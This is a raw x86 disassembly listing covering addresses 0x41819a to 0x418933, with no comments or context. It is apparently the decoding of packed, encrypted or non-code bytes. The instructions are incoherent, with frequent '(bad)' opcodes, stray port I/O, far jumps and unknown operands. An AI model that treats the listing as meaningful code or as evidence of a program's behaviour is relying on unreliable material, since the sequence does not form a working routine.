  41819a:	aad    0x29
  41819c:	push   edi
  41819d:	dec    ecx
  41819e:	aas    
  41819f:	loope  0x41821b
  4181a1:	adc    BYTE PTR [esi+esi*8-0x18ab0500],bh
  4181a8:	dec    eax
  4181a9:	int    0x8c
  4181ab:	mov    bh,0x72
  4181ad:	div    BYTE PTR [ebp+0x57db687b]
  4181b3:	dec    esp
  4181b4:	fild   WORD PTR [esi+eiz*2]
  4181b7:	int3   
  4181b8:	xchg   BYTE PTR [ebx],bl
  4181ba:	or     al,0xe0
  4181bc:	mov    ds:0x5ab00861,al
  4181c1:	(bad)  [ecx-0x271932a3]
  4181c7:	cmp    eax,0x3e3a7f08
  4181cc:	nop
  4181cd:	xchg   ebp,eax
  4181ce:	imul   ebx,ecx,0xbeb70ec6
  4181d4:	outs   dx,DWORD PTR ds:[esi]
  4181d5:	popa   
  4181d6:	mov    bl,0x3a
  4181d8:	mov    al,ds:0x8c2981fe
  4181dd:	(bad)  
  4181de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181df:	cmp    eax,edi
  4181e1:	dec    eax
  4181e2:	je     0x4181bc
  4181e4:	jge    0x4181b8
  4181e6:	mov    ebp,eax
  4181e8:	es mov bl,0xb0
  4181eb:	(bad)  
  4181ed:	dec    ebx
  4181ee:	mov    esi,0x3c7a416c
  4181f3:	in     al,dx
  4181f4:	lods   eax,DWORD PTR ds:[esi]
  4181f5:	aaa    
  4181f6:	and    ch,ch
  4181f8:	pop    ebx
  4181f9:	pusha  
  4181fa:	mov    esi,0xf0e0298d
  4181ff:	push   ebx
  418200:	xor    BYTE PTR [edi],bh
  418202:	pop    esi
  418203:	test   DWORD PTR [esi+ecx*2],esp
  418206:	(bad)  
  418208:	fcom   QWORD PTR [ebx+0x2d025313]
  41820e:	jle    0x4181a6
  418210:	and    esi,0x35112cca
  418216:	mov    WORD PTR [eax+0x35],?
  418219:	add    dl,BYTE PTR [ecx+0x12]
  41821c:	or     DWORD PTR [ebx],ebx
  41821e:	test   al,0xad
  418220:	js     0x418289
  418222:	ja     0x4181a4
  418224:	ds cmp al,0x14
  418227:	enter  0xb59c,0x7f
  41822b:	and    ebp,edi
  41822d:	inc    eax
  41822e:	cmp    BYTE PTR [ecx+eiz*2],bh
  418231:	push   ebp
  418232:	pop    ebx
  418233:	jp     0x418270
  418235:	dec    esp
  418236:	mov    eax,0xce53846f
  41823b:	jmp    0xeac9:0x87352402
  418242:	adc    esi,ecx
  418244:	stos   BYTE PTR es:[edi],al
  418245:	or     al,0x7f
  418247:	addr16 jge 0x418201
  41824a:	jns    0x41825b
  41824c:	imul   ebx,DWORD PTR [edx-0x1e],0xd3ec32fa
  418253:	cmp    DWORD PTR [eax-0x25],ebx
  418256:	cs das 
  418258:	cmp    dh,cl
  41825a:	gs leave 
  41825c:	je     0x418225
  41825e:	push   ds
  41825f:	sbb    al,0x18
  418261:	stos   DWORD PTR es:[edi],eax
  418262:	jnp    0x41828e
  418264:	and    edi,DWORD PTR ds:0x5734a6e3
  41826a:	nop
  41826b:	lods   al,BYTE PTR ds:[esi]
  41826c:	stos   DWORD PTR es:[edi],eax
  41826d:	xor    cl,al
  41826f:	mov    ecx,DWORD PTR [edi+0x26]
  418272:	mov    ebx,0xc8271216
  418277:	setns  BYTE PTR [esi*4-0x3eb8e7e1]
  41827f:	and    ah,BYTE PTR cs:[ebx-0x4def62c5]
  418286:	arpl   WORD PTR [eax-0x37],sp
  418289:	sar    BYTE PTR [ecx],cl
  41828b:	adc    bl,BYTE PTR [esi+0x38]
  41828e:	jmp    0xcd37:0x4b0ec725
  418295:	push   es
  418296:	fs cmp eax,0x6eef0432
  41829c:	rcl    DWORD PTR [ebx+0x64],0xef
  4182a0:	or     al,BYTE PTR [edi]
  4182a2:	mov    ch,0x72
  4182a4:	(bad)  
  4182a5:	(bad)  
  4182a6:	jge    0x4182d9
  4182a8:	sub    dl,dl
  4182aa:	sub    BYTE PTR [eax-0x4e],dl
  4182ad:	and    dh,BYTE PTR [esi+0x2a]
  4182b0:	jbe    0x418274
  4182b2:	icebp  
  4182b3:	das    
  4182b4:	mov    ds:0x984eef82,eax
  4182b9:	cwde   
  4182ba:	rcl    bh,1
  4182bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182bd:	test   al,0x8e
  4182bf:	adc    eax,0xa21f4a02
  4182c4:	popa   
  4182c5:	or     ebx,DWORD PTR es:0xbbc55b6c
  4182cc:	out    dx,al
  4182cd:	jb     0x418295
  4182cf:	cmp    al,0x51
  4182d1:	mov    ch,0xeb
  4182d3:	cmp    edi,ecx
  4182d5:	(bad)  [ebp+0x34770567]
  4182db:	pop    edi
  4182dc:	ret    0x9851
  4182df:	pushf  
  4182e0:	scas   al,BYTE PTR es:[edi]
  4182e1:	lea    esi,[ecx-0xb5b73db]
  4182e7:	dec    esp
  4182e8:	pop    ebx
  4182e9:	xchg   ecx,eax
  4182ea:	xor    edi,DWORD PTR [edx-0x2e17087c]
  4182f0:	add    ebx,DWORD PTR ds:0x2a88e8d7
  4182f6:	jecxz  0x418341
  4182f8:	sbb    eax,0x30e6a4e9
  4182fd:	push   es
  4182fe:	cmp    al,0x9d
  418300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418301:	sbb    BYTE PTR [ebx-0x35],dh
  418304:	and    al,0xd9
  418306:	lods   al,BYTE PTR ds:[esi]
  418307:	pusha  
  418308:	sar    ch,1
  41830a:	push   0xa93871d0
  41830f:	cmp    al,0x3e
  418311:	inc    eax
  418312:	inc    edx
  418313:	xlat   BYTE PTR ds:[ebx]
  418314:	(bad)  
  418315:	push   ebx
  418316:	outs   dx,DWORD PTR ds:[esi]
  418317:	inc    esi
  418318:	pop    ds
  418319:	xchg   esi,eax
  41831a:	xor    DWORD PTR [esp],edx
  41831d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41831e:	or     eax,0xd82ae1e3
  418323:	xchg   dl,bh
  418325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418326:	pop    edx
  418327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418328:	mov    dl,0xe4
  41832a:	dec    ebx
  41832b:	scas   eax,DWORD PTR es:[edi]
  41832c:	push   edi
  41832d:	icebp  
  41832e:	pusha  
  41832f:	repz mov bl,0x8c
  418332:	clc    
  418333:	pop    ebp
  418334:	nop
  418335:	pop    esp
  418336:	test   eax,0x39aa1210
  41833b:	xchg   DWORD PTR [ebx+edx*1+0x3209ab16],ecx
  418342:	lahf   
  418343:	sahf   
  418344:	inc    ecx
  418345:	push   cs
  418346:	fist   DWORD PTR [esi+0x3f]
  418349:	and    BYTE PTR [eax],ch
  41834b:	daa    
  41834c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41834d:	leave  
  41834e:	in     al,dx
  41834f:	out    0x65,eax
  418351:	scas   eax,DWORD PTR es:[edi]
  418352:	cwde   
  418353:	leave  
  418354:	clc    
  418355:	pop    esi
  418356:	loop   0x418340
  418358:	xor    al,0xe9
  41835a:	inc    ebx
  41835b:	and    DWORD PTR [edi-0xc],ebp
  41835e:	mov    esi,0x50770dbf
  418363:	lea    eax,[esp+ecx*1-0x59924c3b]
  41836a:	sbb    DWORD PTR [edi+0x39],edi
  41836d:	into   
  41836e:	outs   dx,DWORD PTR ds:[esi]
  41836f:	cmp    cl,cl
  418371:	push   ds
  418372:	hlt    
  418373:	inc    edx
  418374:	jp     0x4183e1
  418376:	retf   0x1428
  418379:	fsubr  DWORD PTR [edi+0x1e]
  41837c:	out    dx,eax
  41837d:	or     ebx,ecx
  41837f:	mov    ds:0xb1a16d54,eax
  418384:	adc    cl,BYTE PTR [edi+0x1b]
  418387:	(bad)  
  418388:	jnp    0x418409
  41838a:	pusha  
  41838b:	test   eax,0x658587ea
  418390:	hlt    
  418391:	mov    edi,DWORD PTR [esi+0x32]
  418394:	icebp  
  418395:	stos   DWORD PTR es:[di],eax
  418397:	mov    esi,0x980b31be
  41839c:	jb     0x4183b6
  41839e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41839f:	mov    dh,0x7
  4183a1:	mov    dh,dl
  4183a3:	retf   
  4183a4:	ds jg  0x41835b
  4183a7:	bts    DWORD PTR [eax],edi
  4183aa:	jnp    0x418351
  4183ac:	ja     0x4183ac
  4183ae:	loope  0x418388
  4183b0:	fmul   DWORD PTR [edx-0x48]
  4183b3:	pushf  
  4183b4:	adc    ebp,ebp
  4183b6:	push   es
  4183b7:	xchg   ecx,eax
  4183b8:	lods   eax,DWORD PTR ds:[esi]
  4183b9:	jne    0x4183c3
  4183bb:	mov    al,ds:0xf4ecf9c7
  4183c0:	loopne 0x41834f
  4183c2:	push   eax
  4183c3:	xchg   esi,eax
  4183c4:	push   0x2b87ff6e
  4183c9:	jl     0x4183ed
  4183cb:	sbb    al,0xb0
  4183cd:	push   ebp
  4183ce:	pop    eax
  4183cf:	int    0xa
  4183d1:	lods   eax,DWORD PTR ds:[esi]
  4183d2:	cmc    
  4183d3:	cmp    ebp,ebp
  4183d5:	gs in  eax,0x2d
  4183d8:	das    
  4183d9:	cdq    
  4183da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183db:	mov    dh,0x23
  4183dd:	stos   DWORD PTR es:[edi],eax
  4183de:	add    bh,BYTE PTR [ecx+0x4b2d5236]
  4183e4:	test   DWORD PTR [edi],edi
  4183e6:	jl     0x418408
  4183e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183e9:	jo     0x4183e1
  4183eb:	sahf   
  4183ec:	js     0x41838f
  4183ee:	adc    DWORD PTR [edx],esi
  4183f0:	push   0xb1853c77
  4183f5:	in     al,0x79
  4183f7:	mov    ah,BYTE PTR [ebx-0x5a8a0375]
  4183fd:	mov    bh,0xe3
  4183ff:	mov    DWORD PTR [edi],ebp
  418401:	sti    
  418402:	aad    0xa5
  418404:	icebp  
  418405:	dec    edi
  418406:	push   edi
  418407:	retf   0x972b
  41840a:	rcl    BYTE PTR [eax],cl
  41840c:	mov    ah,0x98
  41840e:	jmp    0x41845b
  418410:	lock es ds sbb al,0xf1
  418415:	out    dx,al
  418416:	test   DWORD PTR ds:0xf02bc8e8,edi
  41841c:	push   ss
  41841d:	mov    eax,ds:0x73e65a0a
  418422:	sub    ebx,edi
  418424:	xchg   DWORD PTR [ecx-0x26281724],edi
  41842a:	mov    ecx,0x8a441427
  41842f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418430:	push   ss
  418431:	adc    ecx,DWORD PTR [edi+ebp*2-0x46]
  418435:	and    dl,0x18
  418438:	cmp    al,0x3c
  41843a:	cmp    dl,BYTE PTR [esi+edi*8-0x1c609432]
  418441:	xchg   ecx,eax
  418442:	daa    
  418443:	in     eax,0x21
  418445:	cmp    DWORD PTR [ebx+0x985e5f7],edx
  41844b:	push   ebp
  41844c:	test   eax,0xc230c37f
  418451:	lds    ebp,FWORD PTR [ebp+0x77]
  418454:	shl    DWORD PTR ds:0x9cef0a,1
  41845a:	mov    ds:0xb4a000f3,eax
  41845f:	sbb    DWORD PTR [eax],edx
  418461:	nop
  418462:	or     cl,BYTE PTR [ebp+ecx*2+0x46]
  418466:	pop    ebx
  418467:	into   
  418468:	ror    BYTE PTR [ebx-0x56],cl
  41846b:	jg     0x4184d2
  41846d:	lods   eax,DWORD PTR ds:[esi]
  41846e:	das    
  41846f:	adc    al,0xd6
  418471:	pop    eax
  418472:	xchg   ecx,eax
  418473:	iret   
  418474:	ret    0x7389
  418477:	retf   
  418478:	aad    0xba
  41847a:	mul    BYTE PTR [edx]
  41847c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41847e:	test   al,0x64
  418480:	pop    ds
  418481:	jnp    0x4184e1
  418483:	mov    al,0x2d
  418485:	lock cmp DWORD PTR [ecx+0x1984ef71],edi
  41848c:	push   ebp
  41848d:	cmp    ebp,DWORD PTR [ebx]
  41848f:	mov    ecx,DWORD PTR [edi-0x3c01d0ab]
  418495:	mov    dl,0x3a
  418497:	pop    edi
  418498:	pop    esp
  418499:	adc    dl,BYTE PTR [edx-0x3a]
  41849c:	add    DWORD PTR [ebp+0x3d],ebp
  41849f:	inc    ebx
  4184a0:	inc    edx
  4184a1:	dec    edx
  4184a2:	shl    ebp,1
  4184a4:	mov    WORD PTR [ecx+0x4d1b6af7],?
  4184aa:	sahf   
  4184ab:	ins    DWORD PTR es:[edi],dx
  4184ac:	add    al,0x23
  4184ae:	jmp    DWORD PTR ss:[eax+0x74564e03]
  4184b5:	push   cs
  4184b6:	cmp    cl,0xca
  4184b9:	daa    
  4184ba:	xor    eax,0x232fe9ac
  4184bf:	push   0x22f402a0
  4184c4:	inc    ebx
  4184c5:	mov    edx,0x4bbc9974
  4184ca:	mov    ah,BYTE PTR [ecx-0x456cf274]
  4184d0:	scas   eax,DWORD PTR es:[edi]
  4184d1:	mov    DWORD PTR [ebx],edx
  4184d3:	adc    DWORD PTR [ebx+0x6d],ebp
  4184d6:	outs   dx,BYTE PTR ds:[esi]
  4184d7:	sahf   
  4184d8:	mov    ebp,0xad39937e
  4184dd:	add    DWORD PTR [ecx+eax*1+0xd],edx
  4184e1:	mov    cl,0xf3
  4184e3:	add    BYTE PTR [edx-0x2b],ah
  4184e6:	pop    ss
  4184e7:	je     0x4184ac
  4184e9:	aam    0xcc
  4184eb:	aam    0x58
  4184ed:	cmp    al,0xac
  4184ef:	loop   0x418474
  4184f1:	pop    ebx
  4184f2:	scas   eax,DWORD PTR es:[edi]
  4184f3:	xchg   ebx,eax
  4184f4:	out    0xa5,eax
  4184f6:	aad    0xf9
  4184f8:	out    0xb5,al
  4184fa:	cmp    al,0x23
  4184fc:	pop    ebx
  4184fd:	xor    al,0x94
  4184ff:	les    eax,FWORD PTR [eax-0x71]
  418502:	cs aad 0xf5
  418505:	or     al,0x44
  418507:	test   al,0x8f
  418509:	xchg   esp,eax
  41850a:	lahf   
  41850b:	std    
  41850c:	in     eax,dx
  41850d:	sub    dl,ch
  41850f:	xor    eax,0x20f597d4
  418514:	mov    cl,0x3b
  418516:	xor    bl,ah
  418518:	arpl   WORD PTR [esi+edx*1+0x1],si
  41851c:	dec    eax
  41851d:	hlt    
  41851e:	inc    ebx
  41851f:	dec    ebp
  418520:	sbb    DWORD PTR [esi+edx*1-0x2b],eax
  418524:	sbb    ebx,ecx
  418526:	mov    ebp,0xfde50551
  41852b:	adc    al,0xd4
  41852d:	ds adc al,0x49
  418530:	rcl    DWORD PTR ss:[esi],cl
  418533:	inc    DWORD PTR [esi]
  418535:	add    dl,BYTE PTR [ebx+0x1cb87a19]
  41853b:	push   ebx
  41853c:	mov    al,0x44
  41853e:	sub    ah,dl
  418540:	loope  0x4184d6
  418542:	addr16 dec ecx
  418544:	out    dx,eax
  418545:	xor    esi,DWORD PTR [ebx]
  418547:	mov    ecx,0x3fb64513
  41854c:	jl     0x41857c
  41854e:	rcr    ebp,1
  418550:	lahf   
  418551:	mov    WORD PTR [ecx+0x5d],ss
  418554:	push   ecx
  418556:	sbb    al,0xb8
  418558:	dec    ecx
  418559:	mov    ds:0x7e678427,al
  41855e:	push   ss
  41855f:	out    dx,al
  418560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418561:	leave  
  418562:	outs   dx,DWORD PTR ss:[esi]
  418564:	adc    BYTE PTR [ecx-0x5f91313b],cl
  41856a:	mov    ecx,0xa8860130
  41856f:	mov    eax,0x311e230f
  418574:	lahf   
  418575:	(bad)  
  418576:	mov    esi,0xde146941
  41857b:	mov    al,0xae
  41857d:	out    0xce,al
  41857f:	sti    
  418580:	test   BYTE PTR [edx+0x1e],dh
  418583:	cmp    DWORD PTR [eax-0x23],ebx
  418586:	leave  
  418587:	cli    
  418588:	out    dx,al
  418589:	test   eax,0xcd8e6972
  41858e:	inc    ecx
  41858f:	shl    BYTE PTR [esi-0x4a],cl
  418592:	ror    DWORD PTR [ebx],1
  418594:	(bad)  
  418595:	arpl   WORD PTR [edi-0x38],dx
  418598:	add    ecx,esp
  41859a:	xchg   esi,eax
  41859b:	xor    al,0x3a
  41859d:	fild   DWORD PTR [edi-0x6b]
  4185a0:	nop
  4185a1:	dec    ecx
  4185a2:	mov    ah,0x6d
  4185a4:	dec    esi
  4185a5:	and    BYTE PTR [edi],dl
  4185a7:	(bad)  
  4185a8:	xchg   ebx,eax
  4185a9:	retf   
  4185aa:	ss stos BYTE PTR es:[edi],al
  4185ac:	xor    edx,DWORD PTR [ebx+0x34eac393]
  4185b2:	push   ss
  4185b3:	shr    BYTE PTR [eax],cl
  4185b5:	xchg   edi,eax
  4185b6:	aaa    
  4185b7:	or     ch,ch
  4185b9:	mov    DWORD PTR [ebx-0x19],esi
  4185bc:	jae    0x418593
  4185be:	in     eax,0x88
  4185c0:	rol    DWORD PTR [edx-0x69e3d264],0x1c
  4185c7:	fcmovnbe st,st(5)
  4185c9:	rcr    DWORD PTR [edi],cl
  4185cb:	les    ecx,FWORD PTR [esi-0x2e]
  4185ce:	out    dx,al
  4185cf:	outs   dx,BYTE PTR ds:[esi]
  4185d0:	inc    ebx
  4185d1:	call   0x85c0:0x29697270
  4185d8:	rol    BYTE PTR [esi-0x50747b4f],1
  4185de:	adc    edi,DWORD PTR [edi-0x78]
  4185e1:	xchg   ebp,ebx
  4185e3:	pop    esp
  4185e4:	dec    edx
  4185e5:	mov    edx,0xfdc666fc
  4185ea:	leave  
  4185eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185ec:	dec    edi
  4185ed:	xchg   BYTE PTR [ecx-0x3d],bh
  4185f0:	scas   al,BYTE PTR es:[edi]
  4185f1:	leave  
  4185f2:	fnstenv [bp-0x5e33]
  4185f7:	jae    0x41859e
  4185f9:	dec    ecx
  4185fa:	(bad)  
  4185fb:	xor    al,bh
  4185fd:	push   esp
  4185fe:	xor    ecx,DWORD PTR ds:[ebp-0x27]
  418602:	push   ds
  418603:	loope  0x41862b
  418605:	lods   eax,DWORD PTR ds:[esi]
  418606:	pusha  
  418607:	mov    esi,0xe8318594
  41860c:	mov    esp,0x9d8dd7bc
  418611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418612:	test   BYTE PTR [edi-0x7046e072],bl
  418618:	sub    edi,DWORD PTR [ebp+0x149d1da9]
  41861e:	sub    ecx,DWORD PTR [esi]
  418620:	jp     0x4185ac
  418622:	and    eax,0xc42d20d
  418627:	rcr    BYTE PTR [ecx],0xe2
  41862a:	jbe    0x418693
  41862c:	cld    
  41862d:	mov    ch,0x4f
  41862f:	fisub  DWORD PTR [eax]
  418631:	mov    ah,0x6e
  418633:	mov    bl,0xbe
  418635:	jmp    0x4185ed
  418637:	xor    al,0xd
  418639:	pushf  
  41863a:	fmul   QWORD PTR [ecx+0x14]
  41863d:	inc    esi
  41863e:	sbb    eax,DWORD PTR [esi+0x3f919ff2]
  418644:	dec    esp
  418645:	push   cs
  418646:	adc    al,0x2
  418648:	retf   
  418649:	jmp    0x4185e4
  41864b:	xor    al,0xe6
  41864d:	xchg   edx,eax
  41864e:	inc    ecx
  41864f:	sub    dl,BYTE PTR [ebx-0x65e0d5ce]
  418655:	dec    eax
  418656:	dec    esp
  418657:	sub    DWORD PTR [ecx+0x276c3eed],eax
  41865d:	mov    gs,WORD PTR [edi]
  41865f:	pop    ds
  418660:	xchg   edx,eax
  418661:	dec    ebp
  418662:	test   edi,esi
  418664:	fild   DWORD PTR [edi+0x32]
  418667:	add    DWORD PTR [ebx+0xdc243a6],ebp
  41866d:	adc    BYTE PTR [esi-0x42],ch
  418670:	mov    eax,ds:0xeba5b3c4
  418675:	push   0xeef7c6f2
  41867a:	sub    eax,0xfb42dc27
  41867f:	mov    al,0xb6
  418681:	xchg   ebp,eax
  418682:	(bad)
  418686:	scas   eax,DWORD PTR es:[edi]
  418687:	hlt    
  418688:	cmp    cl,al
  41868a:	(bad)  
  41868b:	sbb    ch,BYTE PTR [ecx+0x20478fcd]
  418691:	loop   0x418711
  418693:	cmp    eax,0xc7ed94ef
  418698:	arpl   WORD PTR [edx-0x3d56b550],si
  41869e:	dec    ebp
  41869f:	fcomp  QWORD PTR [eax-0x5cb53f37]
  4186a5:	fwait
  4186a6:	leave  
  4186a7:	sub    eax,0xe0fccad1
  4186ac:	push   ds
  4186ad:	iret   
  4186ae:	popa   
  4186af:	sbb    ebx,DWORD PTR [eax+0x5e]
  4186b2:	cmp    al,0x2b
  4186b4:	sbb    DWORD PTR [esi+0x26],edi
  4186b7:	sbb    esi,DWORD PTR [ecx+eiz*8]
  4186ba:	pushfw 
  4186bc:	mov    ds:0xb8c855b3,al
  4186c1:	xor    BYTE PTR [edx],al
  4186c3:	shr    ebp,cl
  4186c5:	lea    ebx,[eax+0x5eeff777]
  4186cb:	add    bl,BYTE PTR [edx]
  4186cd:	pop    eax
  4186ce:	or     dh,al
  4186d0:	pop    es
  4186d1:	and    eax,0x62126872
  4186d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186d7:	in     eax,dx
  4186d8:	sbb    DWORD PTR [eax-0x1d67d2f7],0x3f44db87
  4186e2:	push   edi
  4186e3:	pop    ss
  4186e4:	add    esi,DWORD PTR [edi+0x6177858a]
  4186ea:	mov    ds:0xcf10be85,eax
  4186ef:	into   
  4186f0:	adc    DWORD PTR [edx-0x6b],esp
  4186f3:	sub    eax,0x57d4cc78
  4186f8:	cmp    DWORD PTR ds:0x6875463c,0x1a
  4186ff:	mov    WORD PTR [edi-0x615d435b],cs
  418705:	push   edx
  418706:	mov    edx,0x3f90f1dd
  41870b:	jns    0x418788
  41870d:	ja     0x418704
  41870f:	retf   
  418710:	dec    ebx
  418711:	dec    esp
  418712:	jno    0x418782
  418714:	xor    edx,esp
  418716:	add    BYTE PTR [edx+0x595742ed],cl
  41871c:	add    ebp,ebx
  41871e:	push   cs
  41871f:	dec    ebx
  418720:	push   esi
  418721:	and    ah,bl
  418723:	cmp    dh,BYTE PTR [eax-0x33]
  418726:	jno    0x418768
  418728:	sbb    BYTE PTR [edx-0x20a5d4aa],ch
  41872e:	call   0x33d282a
  418733:	popa   
  418734:	out    0xd3,al
  418736:	and    al,0x2a
  418738:	into   
  418739:	imul   ecx,ebp,0xffffff83
  41873c:	or     BYTE PTR [ebx-0x7c3ab38e],ah
  418742:	cli    
  418743:	jecxz  0x4187a0
  418745:	sbb    al,0xd4
  418747:	xor    cl,al
  418749:	mov    bl,al
  41874b:	aad    0x94
  41874d:	(bad)  [edi+0x46f05c3e]
  418753:	adc    ebx,DWORD PTR [eax+0x67f677bb]
  418759:	push   0xe8a41980
  41875e:	je     0x41872f
  418760:	sub    BYTE PTR [edi-0x29],dl
  418763:	inc    eax
  418764:	cmp    ebx,DWORD PTR [ecx]
  418766:	jp     0x41877e
  418768:	in     eax,0xb7
  41876a:	stos   BYTE PTR es:[edi],al
  41876b:	adc    edi,DWORD PTR [ebx-0x6f]
  41876e:	aam    0x4b
  418770:	aas    
  418771:	in     al,0x83
  418773:	loope  0x418789
  418775:	add    al,0x94
  418777:	xor    al,0x97
  418779:	js     0x418788
  41877b:	dec    edi
  41877c:	adc    al,0xcf
  41877e:	fs dec esi
  418780:	sbb    BYTE PTR [eax],cl
  418782:	popa   
  418783:	scas   eax,DWORD PTR es:[edi]
  418784:	stos   BYTE PTR es:[edi],al
  418785:	adc    BYTE PTR [ebx+0x31],ah
  418788:	xchg   ebx,eax
  418789:	cld    
  41878a:	neg    DWORD PTR [eax-0x28c20bdf]
  418790:	mov    dl,0xad
  418792:	mul    DWORD PTR [edi-0x7c52232e]
  418798:	mov    bl,0x1e
  41879a:	mov    eax,ss
  41879c:	add    ah,al
  41879e:	adc    eax,0xd370ba80
  4187a3:	ds jne 0x418760
  4187a6:	and    al,0xd9
  4187a8:	test   al,0x8f
  4187aa:	xchg   ebx,eax
  4187ab:	cmp    al,0x4f
  4187ad:	add    esi,esi
  4187af:	icebp  
  4187b0:	jnp    0x4187ff
  4187b2:	dec    ebp
  4187b3:	pop    edx
  4187b4:	int    0x1c
  4187b6:	arpl   WORD PTR [edi-0x2c],sp
  4187b9:	cld    
  4187ba:	xchg   ebp,eax
  4187bb:	add    cl,BYTE PTR [ebx+edx*2-0x624d9b95]
  4187c2:	cmp    DWORD PTR [eax-0x6048a503],ecx
  4187c8:	outs   dx,DWORD PTR ds:[esi]
  4187c9:	pop    ebx
  4187ca:	cmp    BYTE PTR [edx+0x19],bl
  4187cd:	retf   0x6e6e
  4187d0:	scas   al,BYTE PTR es:[edi]
  4187d1:	sar    edi,1
  4187d3:	push   es
  4187d4:	xchg   edi,eax
  4187d5:	rcl    DWORD PTR [ebx-0x559a7893],cl
  4187db:	sbb    al,0x40
  4187dd:	and    ch,al
  4187df:	es inc edx
  4187e1:	or     al,BYTE PTR [eax+eax*1]
  4187e4:	das    
  4187e5:	push   esi
  4187e6:	cdq    
  4187e7:	imul   edi,DWORD PTR [eax+edx*1],0x3386427d
  4187ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187ef:	daa    
  4187f0:	jnp    0x418847
  4187f2:	lea    esi,[ebx-0x15]
  4187f5:	stos   DWORD PTR es:[edi],eax
  4187f6:	je     0x418803
  4187f8:	test   al,0x74
  4187fa:	mov    ds:0x4f5735e,eax
  4187ff:	jmp    0x418826
  418801:	sbb    DWORD PTR [ebp+0x49],esi
  418804:	int3   
  418805:	xor    DWORD PTR [ebp+0x3c],0x1b
  418809:	les    ebp,FWORD PTR [esi-0x3]
  41880c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41880d:	mov    ebx,0xc336e5be
  418812:	lahf   
  418813:	or     eax,0x8ae4cd10
  418818:	add    DWORD PTR [esi-0x17],eax
  41881b:	imul   edi,DWORD PTR [ebp+0x12],0xffffffe9
  41881f:	sub    eax,0xefeb93d6
  418824:	xor    bl,0x18
  418827:	clc    
  418828:	int    0xaf
  41882a:	or     BYTE PTR [esi+0x1e6a305f],cl
  418830:	out    0x84,al
  418832:	imul   ecx,DWORD PTR [ebp+eiz*2+0x1bf3d4f7],0x1c8ea10b
  41883d:	sub    esp,DWORD PTR [esi+0x2f]
  418840:	mov    esi,esi
  418842:	mov    ebp,0x966736f2
  418847:	sti    
  418848:	mov    eax,ds:0x9c8c0f42
  41884d:	and    ebx,esp
  41884f:	test   eax,0xeb15b621
  418854:	sbb    bl,BYTE PTR [ebp-0x6b]
  418857:	retf   
  418858:	or     DWORD PTR [edi+0x1834381a],0xffffffd6
  41885f:	jne    0x4188b9
  418861:	call   0x17fb9f24
  418866:	or     ebx,DWORD PTR cs:[edi+0x49]
  41886a:	mov    ecx,0x51549f8a
  41886f:	je     0x4188f0
  418871:	dec    eax
  418872:	xchg   ecx,eax
  418873:	mov    al,ds:0x56189f97
  418878:	fist   DWORD PTR [eax+0x70]
  41887b:	call   0xbd8b59e0
  418880:	xchg   esi,eax
  418881:	mov    WORD PTR cs:[ecx+eiz*1],?
  418885:	je     0x418900
  418887:	pusha  
  418888:	xor    DWORD PTR [edx],0x78f643bd
  41888e:	aaa    
  41888f:	lock inc esi
  418891:	sahf   
  418892:	test   eax,0x84ecfbe2
  418897:	pop    ss
  418898:	je     0x4188b7
  41889a:	dec    eax
  41889b:	lahf   
  41889c:	and    bl,BYTE PTR [edx+0x5fb32bf3]
  4188a2:	dec    ecx
  4188a3:	je     0x418845
  4188a5:	fcomp  QWORD PTR [edx]
  4188a7:	push   es
  4188a8:	les    esp,FWORD PTR [eax]
  4188aa:	outs   dx,BYTE PTR ds:[esi]
  4188ab:	jmp    0x221a:0x6e7f79d1
  4188b2:	nop
  4188b3:	cwde   
  4188b4:	add    ebp,DWORD PTR [edx-0x5]
  4188b7:	shr    DWORD PTR [ebx],1
  4188b9:	xor    DWORD PTR [edi+0x4b8633f7],ebx
  4188bf:	fst    QWORD PTR [esi]
  4188c1:	cmc    
  4188c2:	pop    ds
  4188c3:	pop    ss
  4188c4:	sbb    ecx,DWORD PTR [ebp+0x20]
  4188c7:	xchg   ecx,eax
  4188c8:	sbb    dh,bh
  4188ca:	sbb    DWORD PTR [esi-0x7b],ebp
  4188cd:	clc    
  4188ce:	outs   dx,DWORD PTR ds:[esi]
  4188cf:	arpl   bx,dx
  4188d1:	fld    QWORD PTR [esi]
  4188d3:	and    edx,DWORD PTR [ecx-0x20]
  4188d6:	xlat   BYTE PTR ds:[ebx]
  4188d7:	retf   0x46d2
  4188da:	mov    eax,ds:0x1dea0764
  4188df:	fdivr  QWORD PTR [ebx-0x69703110]
  4188e5:	int3   
  4188e6:	adc    eax,0x51a99a9
  4188eb:	fimul  DWORD PTR [eax+0x16]
  4188ee:	sahf   
  4188ef:	xor    BYTE PTR [esi],dl
  4188f1:	sar    DWORD PTR [esp+eax*8+0x16a9eee6],1
  4188f8:	push   cs
  4188f9:	xchg   ebx,ebp
  4188fb:	or     ebx,DWORD PTR [ebp-0x6d055994]
  418901:	dec    ebx
  418902:	fistp  QWORD PTR [ebx]
  418904:	xor    eax,0xc9c18b
  418909:	inc    ebx
  41890a:	xor    al,0x56
  41890c:	inc    esp
  41890d:	ret    
  41890e:	push   eax
  41890f:	xchg   edx,eax
  418910:	pop    esp
  418911:	lea    ebx,[ebx-0x2a9fc58]
  418917:	sbb    eax,0x8c65c86a
  41891c:	mov    ?,WORD PTR [ecx+0x405e1714]
  418922:	sbb    DWORD PTR [edx-0x48],0x21
  418926:	cmp    eax,0x9a7703f
  41892b:	pushaw 
  41892d:	ja     0x4189a7
  41892f:	fwait
  418930:	pop    esp
  418931:	clc    
  418932:	push   esi
  418933:	jecxz  0x41895c
